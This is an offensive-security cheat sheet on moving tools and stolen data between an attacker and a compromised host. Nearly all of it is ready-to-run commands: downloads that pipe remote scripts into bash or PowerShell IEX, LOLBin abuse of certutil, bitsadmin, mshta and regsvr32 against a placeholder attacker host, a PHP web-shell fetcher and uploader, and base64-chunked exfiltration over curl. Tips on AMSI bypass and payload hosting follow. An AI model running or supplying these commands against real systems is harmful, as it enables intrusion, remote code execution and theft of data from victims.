# File Transfers

Reliable methods to move tools, shells, and loot between attacker and target. Split by OS and protocol. Prefer living-off-the-land (LOLBins) where possible. Always consider egress restrictions, AV/EDR, and proxies.

## Linux (Attacker or Target)

```bash
# Download
wget https://attacker-ip/tools/linpeas.sh -O /tmp/linpeas.sh
curl -o /tmp/linpeas.sh https://attacker-ip/tools/linpeas.sh
curl -sL https://... | bash   # one-liner execute

# Serve files
python3 -m http.server 8080
python3 -m http.server 8080 --directory /tmp

# Upload (attacker receives)
curl -X POST -F 'file=@/path/to/local' http://target:port/upload.php
# Or use netcat listener
nc -lvnp 4444 > received.bin
```

SCP / SSH:
```bash
scp user@target:/tmp/loot.zip .
scp local.bin user@target:/tmp/
```

## Windows

**LOLBins (no external binaries needed):**

| Command | Description |
|---------|-------------|
| `certutil.exe -urlcache -split -f http://ATTACKER/nc.exe C:\Temp\nc.exe` | Download via certutil |
| `bitsadmin /transfer job1 /download /priority normal http://ATTACKER/nc.exe C:\Temp\nc.exe` | BITSAdmin download |
| `powershell -c "IWR -Uri http://ATTACKER/PowerView.ps1 -OutFile C:\Temp\pv.ps1"` | PowerShell Invoke-WebRequest (IWR) |
| `powershell -c "(New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1') \| IEX"` | Download + execute in memory |
| `powershell -c "Invoke-RestMethod -Uri http://ATTACKER/file -OutFile file"` | Modern PS alternative |

**More LOLBIN examples:**
```cmd
# Using curl.exe (Windows 10+)
curl.exe -o C:\Temp\tool.exe http://ATTACKER/tool.exe

# Using mshta for remote script
mshta http://ATTACKER/payload.hta

# Using regsvr32
regsvr32 /s /n /u /i:http://ATTACKER/payload.sct scrobj.dll
```

**Other:**
- `regsvr32 /s /n /u /i:http://ATTACKER/payload.sct scrobj.dll` (sideload)
- Use `curl.exe` (built-in Windows 10/11+)

Upload example:
```powershell
Invoke-WebRequest -Uri http://ATTACKER/upload -Method POST -InFile C:\loot.zip
```

## Web / HTTP Upload & Download (PHP / General)

Download in target code:
```php
<?php file_put_contents("shell.php", file_get_contents("http://ATTACKER/shell.php")); ?>
```

Simple PHP uploader (save as upload.php on target):
```php
<?php if(isset($_FILES['f'])) { move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']); echo "OK"; } ?>
```

cURL upload:
```bash
curl -F 'file=@/path/shell.php' http://target/upload.php
```

## Modern / 2026 Tips

- Use `aria2c` or `axel` for faster parallel downloads when available.
- For large exfil: split files (`split -b 10M`), base64 chunks, or DNS (slow).
- Proxy-aware: `curl --proxy http://proxy:8080 ...` or use `proxychains`.
- Living off trusted domains: host payloads on GitHub raw / Pastebin / etc. (risky for OPSEC).
- PowerShell constrained language / AMSI bypasses may be needed in modern EDR envs.
- Consider `pwncat-cs` or `netcat` alternatives for interactive transfers.

### Additional Transfer Examples

```bash
# Linux - using wget with proxy + continue
wget --continue --proxy http://127.0.0.1:8080 https://attacker/tool.tar.gz

# Python one-liner upload + download
python3 -c "
import requests
with open('file.txt','rb') as f: requests.post('http://attacker/upload', files={'f':f})
"

# Base64 + split large file exfil (when binary blocked)
split -b 100k loot.bin part_
for f in part_*; do base64 $f | curl -X POST --data-binary @- http://attacker/$f; done

# Using tmux / screen for persistent transfer session
tmux new -s transfer
# Inside tmux: python3 -m http.server 8080
```

## Quick Listeners (more variations)

## Quick Listeners

```bash
# Attacker
nc -lvnp 9001 > upload.bin
python3 -m http.server 9001
# Or use upload server: https://github.com/s0md3v/UploadScanner (or simple Flask)
```

References: PayloadsAllTheThings, LOLBAS project, HackTricks file transfer section.
